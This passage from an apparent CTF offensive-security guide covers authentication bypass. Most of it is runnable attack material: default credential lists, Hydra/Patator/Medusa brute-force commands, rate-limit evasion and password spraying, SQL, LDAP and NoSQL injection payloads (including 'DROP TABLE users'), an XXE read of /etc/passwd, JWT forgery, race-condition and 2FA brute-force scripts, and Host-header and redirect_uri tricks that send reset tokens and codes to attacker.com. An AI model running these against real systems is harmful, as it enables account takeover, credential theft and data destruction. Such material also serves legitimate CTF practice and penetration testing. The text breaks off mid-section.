1. **Start simple, escalate complexity**: Begin with base payload, then layer encoding only if needed
2. **Understand target parser**: Different contexts (SQL, HTML, bash) require different techniques
3. **Combine techniques**: Multi-layer encoding + polymorphism often defeats signature detection
4. **Test systematically**: Document what works to identify filter logic
5. **Context matters**: `'` in SQL needs different treatment than in HTML attribute

**Important subtopics to explore next:**

- **Filter/WAF Enumeration**: Techniques to identify what's being blocked
- **Context-Specific Escaping**: Deep dive into breaking out of different contexts (JSON, XML, etc.)
- **Automated Payload Generation**: Building custom fuzzers for encoding variations

---

# Authentication Bypass Techniques

## Default Credential Lists

### Common Default Credentials

Default credentials are manufacturer or developer-set username/password combinations that remain unchanged in production systems. These represent critical security weaknesses in CTF and real-world scenarios.

**High-Value Default Credentials:**

- **Tomcat**: `tomcat:tomcat`, `admin:admin`, `tomcat:s3cret`
- **MySQL**: `root:` (empty), `root:root`, `root:password`
- **PostgreSQL**: `postgres:postgres`, `postgres:password`
- **MongoDB**: No authentication by default on older versions
- **Jenkins**: `admin:password`, `admin:admin`
- **Grafana**: `admin:admin`
- **RabbitMQ**: `guest:guest`
- **Elasticsearch**: No authentication by default (pre-8.0)

### Default Credential Resources

**SecLists Collection** (comes with Kali):

```bash
# Location of default credential lists
/usr/share/seclists/Passwords/Default-Credentials/

# Key files:
# - default-passwords.csv (comprehensive)
# - ftp-betterdefaultpasslist.txt
# - ssh-betterdefaultpasslist.txt
# - telnet-betterdefaultpasslist.txt
```

**Using Default Credentials in Hydra:**

```bash
# Create username:password pairs from CSV
awk -F',' '{print $1":"$2}' /usr/share/seclists/Passwords/Default-Credentials/default-passwords.csv > default_pairs.txt

# Test against HTTP basic auth
hydra -C default_pairs.txt http-get://target.ctf:8080/admin

# Test against SSH
hydra -C default_pairs.txt ssh://target.ctf

# Test against FTP
hydra -C default_pairs.txt ftp://target.ctf
```

**Common Router/IoT Defaults:**

- `admin:admin`
- `admin:password`
- `admin:1234`
- `root:root`
- `ubnt:ubnt` (Ubiquiti)
- `admin:` (empty password)

### Manual Testing Strategy

```bash
# 1. Identify service/application version
nmap -sV -p 80,443,8080 target.ctf

# 2. Search for specific defaults
grep -i "tomcat" /usr/share/seclists/Passwords/Default-Credentials/default-passwords.csv

# 3. Test via curl
curl -u admin:admin http://target.ctf:8080/manager/html
curl -u tomcat:s3cret http://target.ctf:8080/manager/html

# 4. Test with credentials in URL
curl http://admin:admin@target.ctf:8080/admin
```

## Brute Force Attacks

### Hydra - Primary Brute Force Tool

**HTTP Form-Based Authentication:**

```bash
# Basic POST form brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.ctf http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid credentials"

# With CSRF token handling (examine source first)
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.ctf http-post-form "/login:username=^USER^&password=^PASS^&csrf=^CSRF^:F=Invalid:H=Cookie: session=abc123"

# Multiple usernames
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt target.ctf http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"

# GET-based authentication
hydra -l admin -P passwords.txt target.ctf http-get-form "/login:username=^USER^&password=^PASS^:F=failed"

# Custom failure string detection
hydra -l admin -P passwords.txt target.ctf http-post-form "/login:user=^USER^&pass=^PASS^:S=Welcome" # Success string

# With session cookies
hydra -l admin -P passwords.txt target.ctf http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid:H=Cookie: PHPSESSID=abc123xyz"
```

**HTTP Basic Authentication:**

```bash
# Basic auth brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.ctf http-get /admin

# HTTPS with basic auth
hydra -l admin -P passwords.txt -s 443 target.ctf https-get /secure
```

**SSH Brute Force:**

```bash
# Standard SSH brute force
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://target.ctf

# Multiple users
hydra -L users.txt -P passwords.txt ssh://target.ctf

# Specific port
hydra -l admin -P passwords.txt ssh://target.ctf -s 2222

# Faster parallel tasks (default 16)
hydra -l admin -P passwords.txt -t 4 ssh://target.ctf
```

**FTP Brute Force:**

```bash
hydra -l ftp -P /usr/share/wordlists/rockyou.txt ftp://target.ctf
hydra -L users.txt -P passwords.txt ftp://target.ctf
```

**Database Brute Force:**

```bash
# MySQL
hydra -l root -P passwords.txt mysql://target.ctf

# PostgreSQL
hydra -l postgres -P passwords.txt postgres://target.ctf

# MSSQL
hydra -l sa -P passwords.txt mssql://target.ctf
```

### Patator - Advanced Brute Force Framework

Patator provides more flexibility than Hydra for complex scenarios.

```bash
# Install if not present
apt-get install patator

# HTTP basic auth
patator http_fuzz url=http://target.ctf/admin method=GET user_pass=admin:FILE0 0=/usr/share/wordlists/rockyou.txt -x ignore:code=401

# HTTP POST form
patator http_fuzz url=http://target.ctf/login method=POST body='username=admin&password=FILE0' 0=passwords.txt follow=1 accept_cookie=1 -x ignore:fgrep='Invalid'

# SSH brute force with timing
patator ssh_login host=target.ctf user=root password=FILE0 0=passwords.txt -x ignore:mesg='Authentication failed'

# Rate limiting (1 attempt per second)
patator ssh_login host=target.ctf user=admin password=FILE0 0=passwords.txt -x ignore:mesg='Authentication failed' --rate-limit=1
```

### Medusa - Multi-Protocol Brute Forcer

```bash
# SSH
medusa -h target.ctf -u admin -P /usr/share/wordlists/rockyou.txt -M ssh

# HTTP basic auth
medusa -h target.ctf -u admin -P passwords.txt -M http -m DIR:/admin

# Multiple hosts
medusa -H hosts.txt -u admin -P passwords.txt -M ssh

# FTP
medusa -h target.ctf -u ftp -P passwords.txt -M ftp
```

### WFuzz - Web Application Fuzzer

```bash
# POST parameter brute force
wfuzz -c -z file,/usr/share/wordlists/rockyou.txt -d "username=admin&password=FUZZ" --hh 1234 http://target.ctf/login

# Username enumeration
wfuzz -c -z file,usernames.txt -d "username=FUZZ&password=test" --sc 200 http://target.ctf/login

# HTTP header brute force
wfuzz -c -z file,passwords.txt -H "Authorization: Basic YWRtaW46RlVaWg==" --hc 401 http://target.ctf/admin

# Cookie-based auth
wfuzz -c -z file,session_ids.txt -b "sessionid=FUZZ" --sc 200 http://target.ctf/dashboard
```

### Burp Suite Intruder

**Setting Up Brute Force Attack:**

1. Intercept login request
2. Send to Intruder (Ctrl+I)
3. Clear all markers (Clear §)
4. Select password parameter → Add §
5. Payloads tab → Load password list
6. Options → Grep-Match → Add success indicator
7. Start attack

**Attack Types:**

- **Sniper**: Single position, one payload set (username OR password)
- **Battering ram**: Multiple positions, same payload
- **Pitchfork**: Multiple positions, parallel iteration
- **Cluster bomb**: Multiple positions, all combinations

```
# Example Pitchfork (username + password pairs)
Position 1: admin, user, root
Position 2: admin123, password, toor
Result: admin:admin123, user:password, root:toor

# Example Cluster bomb (all combinations)
Position 1: admin, user
Position 2: pass1, pass2
Result: admin:pass1, admin:pass2, user:pass1, user:pass2
```

### Rate Limiting Bypass Techniques

**IP Rotation with Proxychains:**

```bash
# Configure proxychains (/etc/proxychains4.conf)
# Add multiple proxies
dynamic_chain
proxy_dns
[ProxyList]
socks5 127.0.0.1 9050
socks5 proxy2.com 1080
socks5 proxy3.com 1080

# Use with hydra
proxychains hydra -l admin -P passwords.txt ssh://target.ctf
```

**X-Forwarded-For Header Manipulation:**

```bash
# Hydra with custom headers
hydra -l admin -P passwords.txt target.ctf http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid:H=X-Forwarded-For: 10.0.0.RANDOM"

# Curl with rotating IPs
for i in {1..255}; do
    curl -H "X-Forwarded-For: 192.168.1.$i" -d "username=admin&password=test$i" http://target.ctf/login
done
```

**Time Delays:**

```bash
# Hydra with task limiting
hydra -l admin -P passwords.txt -t 1 ssh://target.ctf

# Custom script with delays
while read pass; do
    curl -d "username=admin&password=$pass" http://target.ctf/login
    sleep 2
done < passwords.txt
```

## Dictionary Attacks

### Wordlist Selection

**Kali Default Locations:**

```bash
/usr/share/wordlists/rockyou.txt              # 14M passwords (decompress first)
/usr/share/wordlists/rockyou.txt.gz           # Compressed version
/usr/share/seclists/Passwords/               # Organized password lists
/usr/share/wordlists/dirb/common.txt          # Web directories
/usr/share/wordlists/wfuzz/                   # Various fuzzing lists
```

**Decompressing RockYou:**

```bash
# Decompress if needed
gunzip /usr/share/wordlists/rockyou.txt.gz

# Verify
wc -l /usr/share/wordlists/rockyou.txt
# Output: 14344392 lines
```

**SecLists Password Categories:**

```bash
/usr/share/seclists/Passwords/Common-Credentials/
/usr/share/seclists/Passwords/Default-Credentials/
/usr/share/seclists/Passwords/Leaked-Databases/
/usr/share/seclists/Passwords/Malware/
/usr/share/seclists/Passwords/Permutations/
/usr/share/seclists/Passwords/WiFi-WPA/
```

### Custom Wordlist Generation

**CeWL - Web Scraper for Custom Wordlists:**

```bash
# Basic website scraping
cewl http://target.ctf -w custom_wordlist.txt

# Depth control (follow links)
cewl http://target.ctf -d 3 -w wordlist.txt

# Minimum word length
cewl http://target.ctf -m 6 -w wordlist.txt

# Include email addresses
cewl http://target.ctf --email -e -w wordlist.txt

# Include metadata
cewl http://target.ctf --meta -w wordlist.txt

# Authentication required
cewl http://target.ctf --auth_user admin --auth_pass password -w wordlist.txt

# Combine with username
cewl http://target.ctf -w words.txt
cat words.txt | sed 's/$/2024/' > wordlist_with_year.txt
```

**Crunch - Pattern-Based Wordlist Generator:**

```bash
# Generate all 4-digit PINs
crunch 4 4 0123456789 -o pins.txt

# Generate passwords (min 6, max 8 chars)
crunch 6 8 abcdefghijklmnopqrstuvwxyz -o passwords.txt

# Pattern-based (@=lowercase, ,=uppercase, %=numbers, ^=symbols)
crunch 8 8 -t admin@@@ -o admin_passwords.txt
# Output: adminaaa, adminaab, adminaac...

crunch 10 10 -t 2024@@@@%% -o year_based.txt
# Output: 2024aaaa00, 2024aaaa01...

# Charset specification
crunch 6 6 -f /usr/share/crunch/charset.lst mixalpha-numeric -o alphanum.txt

# Compress output (for large wordlists)
crunch 8 8 | gzip > large_wordlist.txt.gz
```

**CUPP - User-Profiled Wordlist Generator:**

```bash
# Install if not present
git clone https://github.com/Mebus/cupp.git
cd cupp

# Interactive mode (asks questions about target)
python3 cupp.py -i

# Questions include:
# - First name, surname, nickname
# - Birthdate, partner's name/birthdate
# - Pet name, company name
# - Keywords associated with target

# Download additional wordlists
python3 cupp.py -l

# Improved mode (common substitutions)
python3 cupp.py -i -w
```

**Custom Bash-Based Wordlist Manipulation:**

```bash
# Add common suffixes
cat base_words.txt | sed 's/$/@123/' > words_with_suffix.txt
cat base_words.txt | sed 's/$/2024/' >> words_with_suffix.txt
cat base_words.txt | sed 's/$/!/' >> words_with_suffix.txt

# Add common prefixes
cat base_words.txt | sed 's/^/admin_/' > prefixed_words.txt

# Capitalize first letter
cat words.txt | sed 's/\b\(.\)/\u\1/' > capitalized.txt

# Reverse words
cat words.txt | rev > reversed.txt

# Combine two wordlists
cat list1.txt list2.txt | sort -u > combined.txt

# Filter by length
awk 'length($0) >= 8 && length($0) <= 12' words.txt > filtered.txt

# Remove duplicates
sort -u words.txt -o words_unique.txt
```

**John the Ripper Wordlist Mangling:**

```bash
# Use John's rules to mangle wordlist
john --wordlist=words.txt --rules --stdout > mangled_words.txt

# Specific rule set
john --wordlist=words.txt --rules=KoreLogic --stdout > mangled.txt

# Common John rules produce:
# password → password123, Password, PASSWORD, p@ssword, password!, etc.
```

### Username Enumeration for Dictionary Attacks

**Enumerate Valid Usernames First:**

```bash
# Different response sizes
wfuzz -c -z file,/usr/share/seclists/Usernames/Names/names.txt -d "username=FUZZ&password=test" --hh 1234 http://target.ctf/login

# Timing-based enumeration
wfuzz -c -z file,usernames.txt -d "username=FUZZ&password=wrongpass" --filter "c=200 and ms>500" http://target.ctf/login

# HTTP response code differences
hydra -L usernames.txt -p wrongpassword target.ctf http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid user" | grep -v "Invalid user"
```

**Common Username Lists:**

```bash
/usr/share/seclists/Usernames/Names/names.txt           # First names
/usr/share/seclists/Usernames/top-usernames-shortlist.txt
/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

## Weak Password Policies

### Identifying Weak Policies

**Registration/Password Change Analysis:**

```
# Test during registration:
1. Minimum length (try 1, 2, 3... characters)
2. Maximum length (find truncation point)
3. Character requirements (uppercase, lowercase, numbers, symbols)
4. Dictionary words allowed?
5. Username in password allowed?
6. Incremental passwords (password1, password2)
7. Common passwords (password123, admin123)
```

**Burp Suite Testing:**

```
# Capture password change request
POST /change_password HTTP/1.1
Host: target.ctf
Cookie: session=abc123

old_password=current&new_password=a&confirm=a

# Send to Intruder
# Test passwords: a, aa, aaa, aaaa, aaaaa...
# Observe where policy starts enforcing requirements
```

**Password Policy Enumeration Script:**

```python
#!/usr/bin/env python3
import requests

url = "http://target.ctf/register"
passwords = ["a", "aa", "aaa", "aaaa", "aaaaa", "aaaaaa", "aaaaaaa", "aaaaaaaa"]

for pwd in passwords:
    data = {"username": "test", "password": pwd, "confirm": pwd}
    r = requests.post(url, data=data)
    
    if "successfully" in r.text or r.status_code == 200:
        print(f"[+] Minimum length: {len(pwd)}")
        break
    else:
        print(f"[-] Length {len(pwd)}: {r.text[:50]}")
```

### Exploiting Weak Policies

**No Length Requirement:**

```bash
# Generate single-character passwords
crunch 1 1 abcdefghijklmnopqrstuvwxyz -o single_char.txt
hydra -l admin -P single_char.txt target.ctf http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid"
```

**Short Minimum Length (4-6 chars):**

```bash
# Generate 4-digit combinations
crunch 4 4 0123456789 -o 4digit.txt

# Generate 4-letter combinations
crunch 4 4 abcdefghijklmnopqrstuvwxyz -o 4letter.txt

# Mixed 4-char (alphanumeric)
crunch 4 4 abcdefghijklmnopqrstuvwxyz0123456789 -o 4mixed.txt
```

**No Special Character Requirement:**

```bash
# Focus on alphanumeric only
grep '^[a-zA-Z0-9]*$' /usr/share/wordlists/rockyou.txt > alphanum_only.txt
hydra -l admin -P alphanum_only.txt target.ctf http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid"
```

**No Complexity Requirement:**

```bash
# Common simple passwords
cat > simple_passwords.txt << EOF
password
admin
123456
12345678
qwerty
abc123
password123
admin123
letmein
welcome
EOF

hydra -l admin -P simple_passwords.txt target.ctf http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid"
```

**Sequential/Incremental Allowed:**

```bash
# Generate sequential passwords
for i in {1..1000}; do echo "password$i"; done > sequential.txt
for i in {1..100}; do echo "admin$i"; done >> sequential.txt
for i in {2015..2025}; do echo "company$i"; done >> sequential.txt
```

### Password Spraying for Weak Policies

**Technique**: Use one password against many accounts (avoids account lockout).

```bash
# Top 10 most common passwords
cat > common_top10.txt << EOF
123456
password
12345678
qwerty
123456789
12345
1234
111111
1234567
dragon
EOF

# Spray single password across usernames
hydra -L usernames.txt -p password123 target.ctf ssh
hydra -L usernames.txt -p Welcome2024! target.ctf http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid"

# Script for controlled spraying
#!/bin/bash
USERS="users.txt"
PASSWORD="Summer2024!"

while read user; do
    echo "[*] Testing $user:$PASSWORD"
    curl -s -d "username=$user&password=$PASSWORD" http://target.ctf/login | grep -q "Welcome" && echo "[+] SUCCESS: $user:$PASSWORD"
    sleep 30  # Wait between attempts
done < $USERS
```

**CrackMapExec for Password Spraying (SMB/Windows):**

```bash
# Install if needed
apt-get install crackmapexec

# Password spray against SMB
crackmapexec smb target.ctf -u users.txt -p 'Password123!' --continue-on-success

# Against multiple hosts
crackmapexec smb targets.txt -u users.txt -p 'Summer2024!'
```

## Authentication Logic Flaws

### SQL Injection Authentication Bypass

**Classic SQLi Bypass Payloads:**

```sql
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'#
' OR '1'='1'/*
admin' --
admin' #
admin'/*
' or 1=1--
' or 1=1#
' or 1=1/*
') or '1'='1--
') or ('1'='1--
```

**Testing with Curl:**

```bash
# POST request with SQLi
curl -d "username=admin' OR '1'='1'--&password=anything" http://target.ctf/login

# URL-encoded
curl -d "username=admin%27+OR+%271%27%3D%271%27--&password=anything" http://target.ctf/login

# With cookie session
curl -b "PHPSESSID=abc123" -d "username=admin' OR '1'='1'--&password=x" http://target.ctf/login
```

**SQLMap Automation:**

```bash
# Test login form for SQLi
sqlmap -u "http://target.ctf/login" --data="username=admin&password=test" --level=5 --risk=3

# Specify injection point
sqlmap -u "http://target.ctf/login" --data="username=admin*&password=test" --batch

# Dump database after bypass
sqlmap -u "http://target.ctf/login" --data="username=admin&password=test" --dbs --batch

# With authentication cookie
sqlmap -u "http://target.ctf/login" --data="username=admin&password=test" --cookie="PHPSESSID=abc123"
```

**Advanced SQLi Payloads:**

```sql
# Boolean-based blind
admin' AND '1'='1
admin' AND '1'='2

# Time-based blind
admin' AND SLEEP(5)--
admin' WAITFOR DELAY '0:0:5'--

# UNION-based
' UNION SELECT NULL, NULL--
' UNION SELECT 'admin', 'hash'--

# Comment variations (important for different databases)
-- (MySQL, MSSQL, PostgreSQL)
# (MySQL)
/* */ (MySQL, MSSQL)
;-- (MSSQL)

# Bypass filters
admin'||'1'='1
admin'||'1'='1'||'
admin'%26%26'1'='1

# Multiple statement injection
admin'; DROP TABLE users;--
```

### Response Manipulation

**Status Code Manipulation:**

```
# Vulnerable pattern:
if (checkPassword($user, $pass)) {
    return 200;
} else {
    return 401;
}

# Attack: Intercept 401 response and change to 200
# In Burp: Intercept Response → Change HTTP/1.1 401 to HTTP/1.1 200
```

**Burp Suite Match and Replace:**

```
1. Proxy → Options → Match and Replace
2. Add rule:
   - Type: Response header
   - Match: HTTP/1.1 401 Unauthorized
   - Replace: HTTP/1.1 200 OK
3. Enable rule
4. Attempt login
```

**Response Body Manipulation:**

```json
# Original response
{"success": false, "role": "guest", "redirect": "/login"}

# Modify to
{"success": true, "role": "admin", "redirect": "/dashboard"}

# In Burp: Intercept → Response → Modify JSON → Forward
```

**Cookie Manipulation:**

```bash
# Response sets cookie
Set-Cookie: auth=user; role=guest

# Modify in browser console
document.cookie = "role=admin"

# Or intercept and modify
Set-Cookie: auth=user; role=admin

# Test with curl
curl -b "auth=user; role=admin" http://target.ctf/admin
```

### Missing Server-Side Validation

**Client-Side Bypass:**

```html
<!-- Vulnerable HTML form -->
<form onsubmit="return validateLogin()">
    <input name="username" required>
    <input name="password" type="password" required minlength="8">
    <input type="submit" disabled id="submit">
</form>

<script>
function validateLogin() {
    // Client-side checks only
    if (username.length < 5) return false;
    if (password.length < 8) return false;
    return true;
}
</script>
```

**Bypass Methods:**

```bash
# Direct POST (ignoring JavaScript)
curl -d "username=a&password=a" http://target.ctf/login

# Burp Suite: Intercept and send regardless of validation
# Browser console: Disable JavaScript or modify validation function
document.getElementById('submit').disabled = false;
validateLogin = function() { return true; }
```

**Hidden Parameter Manipulation:**

```html
<!-- Form contains hidden admin flag -->
<input type="hidden" name="isAdmin" value="false">
```

**Exploit:**

```bash
# Modify hidden parameter
curl -d "username=user&password=pass&isAdmin=true" http://target.ctf/login

# In Burp: Intercept → Change isAdmin=false to isAdmin=true
```

### Race Conditions in Authentication

**Parallel Request Attack:**

```python
#!/usr/bin/env python3
import requests
import threading

url = "http://target.ctf/reset_password"
data = {"username": "admin", "new_password": "hacked123"}

def send_request():
    r = requests.post(url, data=data)
    print(r.status_code, r.text[:50])

# Send 100 simultaneous requests
threads = []
for i in range(100):
    t = threading.Thread(target=send_request)
    threads.append(t)
    t.start()

for t in threads:
    t.join()
```

**Burp Suite Turbo Intruder:**

```python
# Turbo Intruder script for race condition
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=50,
                          requestsPerConnection=1,
                          pipeline=False)
    
    request = '''POST /reset_password HTTP/1.1
Host: target.ctf
Content-Type: application/x-www-form-urlencoded

username=admin&new_password=hacked123'''
    
    # Queue 50 simultaneous requests
    for i in range(50):
        engine.queue(request)

def handleResponse(req, interesting):
    table.add(req)
```

### Parameter Pollution

**HTTP Parameter Pollution (HPP):**

```bash
# Send duplicate parameters
curl -d "username=user&username=admin&password=test" http://target.ctf/login

# Server might use first value (user) for logging, second (admin) for auth
# Test variations:
username=user&password=test&username=admin
username[]=user&username[]=admin&password=test
username=user,admin&password=test
```

### JWT Authentication Flaws

**JWT None Algorithm Attack:**

```python
#!/usr/bin/env python3
import jwt
import json

# Original token (copy from browser/Burp)
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsInJvbGUiOiJndWVzdCJ9.signature"

# Decode without verification
payload = jwt.decode(token, options={"verify_signature": False})
print("Original payload:", payload)

# Modify payload
payload['user'] = 'admin'
payload['role'] = 'admin'

# Re-encode with "none" algorithm
header = {"alg": "none", "typ": "JWT"}
forged_token = jwt.encode(payload, key="", algorithm="none", headers=header)
print("Forged token:", forged_token)

# Use forged token
# curl -H "Authorization: Bearer $forged_token" http://target.ctf/admin
```

**JWT Secret Brute Force:**

```bash
# Using jwt_tool
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool
python3 jwt_tool.py <JWT_TOKEN> -C -d /usr/share/wordlists/rockyou.txt

# Using hashcat
# Extract JWT to file
echo -n "eyJ..." > jwt.txt

# Crack with hashcat (mode 16500)
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# Once secret found, forge new token
python3 jwt_tool.py <JWT_TOKEN> -T -S hs256 -p "cracked_secret"
```

**JWT Key Confusion Attack:**

```
[Inference] If server uses RS256 (asymmetric) but improperly accepts HS256 (symmetric), an attacker might use the public key as the HMAC secret.

# Steps:
1. Obtain public key from server (/jwks.json, /.well-known/jwks.json)
2. Convert public key to format usable as HMAC secret
3. Sign token with public key using HS256
4. Send modified token

# This attack requires specific server misconfiguration and is not guaranteed to work
```

### Session Fixation

**Attack Pattern:**

```bash
# 1. Get valid session ID from server
curl -i http://target.ctf/login
# Response: Set-Cookie: SESSIONID=attacker_controlled_id

# 2. Send victim link with fixed session
http://target.ctf/login?SESSIONID=attacker_controlled_id

# 3. After victim logs in, attacker uses same session
curl -b "SESSIONID=attacker_controlled_id" http://target.ctf/dashboard
```

**Testing for Session Fixation:**

```bash
# Check if session ID changes after login
# Before login
curl -i http://target.ctf/login
# Note session ID

# After login
curl -i -d "username=test&password=test" http://target.ctf/login
# If session ID remains same → Vulnerable
```

### Time-Based Authentication Bypass

**Timing Attack on Username:**

```python
#!/usr/bin/env python3
import requests
import time

url = "http://target.ctf/login"
usernames = ["admin", "user", "root", "administrator"]

for username in usernames:
    start = time.time()
    r = requests.post(url, data={"username": username, "password": "wrongpass"})
    elapsed = time.time() - start
    print(f"{username}: {elapsed:.4f}s - Status: {r.status_code}")
    
# Valid usernames may take longer (password comparison happens)
# Invalid usernames may return faster (fail immediately)
```

**Statistical Timing Analysis:**

```python
#!/usr/bin/env python3
import requests
import time
import statistics

url = "http://target.ctf/login"
username = "admin"
iterations = 100

times = []
for i in range(iterations):
    start = time.time()
    r = requests.post(url, data={"username": username, "password": "test"})
    elapsed = time.time() - start
    times.append(elapsed)

print(f"Mean: {statistics.mean(times):.4f}s")
print(f"Median: {statistics.median(times):.4f}s")
print(f"Std Dev: {statistics.stdev(times):.4f}s")
```

### OAuth/SSO Bypass Techniques

**OAuth Token Manipulation:**

```bash
# Capture OAuth callback
http://target.ctf/callback?code=abc123&state=xyz

# Try modifying state parameter
http://target.ctf/callback?code=abc123&state=attacker_state

# Try reusing authorization code
curl "http://target.ctf/callback?code=abc123"
curl "http://target.ctf/callback?code=abc123"  # Second use

# Check if token endpoint validates redirect_uri
curl -X POST http://oauth-provider.com/token \
  -d "grant_type=authorization_code" \
  -d "code=abc123" \
  -d "redirect_uri=http://attacker.com/callback" \
  -d "client_id=target_client_id"
```

**SSO Relay Attack:**

```
[Inference] In some SSO implementations, authentication assertions might be intercepted and replayed if not properly validated.

# Attack flow:
1. Initiate SSO login for victim account
2. Intercept SAML response or OAuth token
3. Replay assertion in attacker's browser session

# Prevention checks:
- Assertions should be time-limited
- Should include audience restriction
- Should be bound to specific session
```

### LDAP Injection Authentication Bypass

**LDAP Query Structure:**

```
# Normal LDAP query
(&(uid=username)(password=userpass))

# Injected query
(&(uid=*)(password=*))
```

**LDAP Injection Payloads:**

```
# Bypass authentication
*
*)(&
*))%00
admin)(&)
admin)(!(&(1=0
*)(uid=*))(|(uid=*

# Testing with curl
curl -d "username=*)(uid=*))(|(uid=*&password=anything" http://target.ctf/login

# Wildcard authentication
curl -d "username=admin)(&(1=1&password=" http://target.ctf/login
```

**LDAP Injection Enumeration:**

```bash
# Enumerate valid users (observe response differences)
curl -d "username=admin*&password=test" http://target.ctf/login
curl -d "username=user*&password=test" http://target.ctf/login
curl -d "username=test*&password=test" http://target.ctf/login

# Blind LDAP injection (timing-based)
curl -d "username=admin)(%26(objectClass=*&password=test" http://target.ctf/login
```

### XML External Entity (XXE) in Authentication

**XXE in SAML Authentication:**

```xml
<!-- Vulnerable SAML request -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<samlp:AuthnRequest xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
  <saml:Issuer xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">&xxe;</saml:Issuer>
</samlp:AuthnRequest>
```

**XXE in XML-based Login:**

```xml
POST /login HTTP/1.1
Host: target.ctf
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<login>
  <username>&xxe;</username>
  <password>test</password>
</login>
```

**Testing with Burp Suite:**

```
1. Intercept XML-based authentication request
2. Add DTD declaration with external entity
3. Reference entity in username/password field
4. Forward request
5. Check response for file contents
```

### NoSQL Injection Authentication Bypass

**MongoDB Injection Payloads:**

```javascript
// Normal query
db.users.find({username: "admin", password: "userpass"})

// Injected query (bypass)
db.users.find({username: "admin", password: {$ne: null}})
```

**JSON POST Payload:**

```json
{
  "username": "admin",
  "password": {"$ne": null}
}
```

**Testing with Curl:**

```bash
# NoSQL injection via JSON
curl -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$ne":null}}' \
  http://target.ctf/login

# Alternative operators
curl -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$gt":""}}' \
  http://target.ctf/login

curl -H "Content-Type: application/json" \
  -d '{"username":{"$ne":null},"password":{"$ne":null}}' \
  http://target.ctf/login

# Regex-based bypass
curl -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$regex":".*"}}' \
  http://target.ctf/login
```

**PHP Array Injection:**

```bash
# If server parses arrays from POST parameters
curl -d "username=admin&password[$ne]=null" http://target.ctf/login
curl -d "username=admin&password[$gt]=" http://target.ctf/login
curl -d "username[$ne]=invalid&password[$ne]=invalid" http://target.ctf/login
```

**NoSQLMap Tool:**

```bash
# Install NoSQLMap
git clone https://github.com/codingo/NoSQLMap.git
cd NoSQLMap

# Scan for NoSQL injection
python nosqlmap.py -u http://target.ctf/login -p username,password --method POST

# Extract data after bypass
python nosqlmap.py -u http://target.ctf/login -p username,password --method POST --attack 2
```

### Two-Factor Authentication Bypass

**Missing Server-Side 2FA Validation:**

```bash
# 1. Login with valid credentials (captures 2FA prompt)
curl -i -c cookies.txt -d "username=admin&password=validpass" http://target.ctf/login
# Server responds: Please enter 2FA code

# 2. Try accessing protected resource directly (skip 2FA step)
curl -b cookies.txt http://target.ctf/dashboard

# If accessible → 2FA validation only client-side
```

**2FA Code Reuse:**

```bash
# Test if same 2FA code works multiple times
curl -d "username=admin&password=validpass&code=123456" http://target.ctf/verify_2fa
# Wait and try again
curl -d "username=admin&password=validpass&code=123456" http://target.ctf/verify_2fa

# If successful twice → Code reuse vulnerability
```

**2FA Code Bruteforce:**

```bash
# If rate limiting not implemented
# 6-digit code = 1,000,000 combinations
crunch 6 6 0123456789 -o 2fa_codes.txt

# Hydra brute force
hydra -l admin -P 2fa_codes.txt target.ctf http-post-form "/verify_2fa:username=^USER^&code=^PASS^:F=Invalid code" -t 64

# Python script with session handling
```

```python
#!/usr/bin/env python3
import requests

session = requests.Session()

# First login
r = session.post("http://target.ctf/login", 
                 data={"username": "admin", "password": "validpass"})

# Brute force 2FA
for code in range(0, 1000000):
    code_str = str(code).zfill(6)
    r = session.post("http://target.ctf/verify_2fa", 
                     data={"code": code_str})
    if "success" in r.text.lower():
        print(f"[+] Valid code found: {code_str}")
        break
    if code % 1000 == 0:
        print(f"[*] Tried {code} codes...")
```

**Response Manipulation (2FA):**

```json
// Original response from 2FA verification
{"success": false, "message": "Invalid 2FA code"}

// Modify in Burp Intercept
{"success": true, "message": "2FA verified"}
```

**Direct Request to Post-2FA Endpoint:**

```bash
# Capture legitimate post-2FA request in Burp
# Replay without going through 2FA flow

# Example: Session token issued after 2FA
# Try predicting/manipulating token
curl -b "session=manipulated_token" http://target.ctf/dashboard
```

### Password Reset Vulnerabilities

**Token Prediction:**

```bash
# Request multiple reset tokens
for i in {1..10}; do
    curl -d "email=test@test.com" http://target.ctf/reset_password
done

# Analyze tokens for patterns
# - Sequential numbers?
# - Timestamp-based?
# - Weak randomness?
```

**Host Header Poisoning:**

```bash
# Send password reset with attacker-controlled Host header
curl -H "Host: attacker.com" \
     -d "email=victim@target.com" \
     http://target.ctf/reset_password

# If vulnerable, reset link sent to victim contains:
# http://attacker.com/reset?token=victim_reset_token

# Attacker receives token via HTTP logs
```

**Parameter Pollution in Reset:**

```bash
# Request password reset with multiple email parameters
curl -d "email=victim@target.com&email=attacker@evil.com" \
     http://target.ctf/reset_password

# Server might:
# - Send token to first email (victim) but use second for validation
# - Send token to both emails
# - Use last email for token but first for sending
```

**Token Leak via Referer:**

```
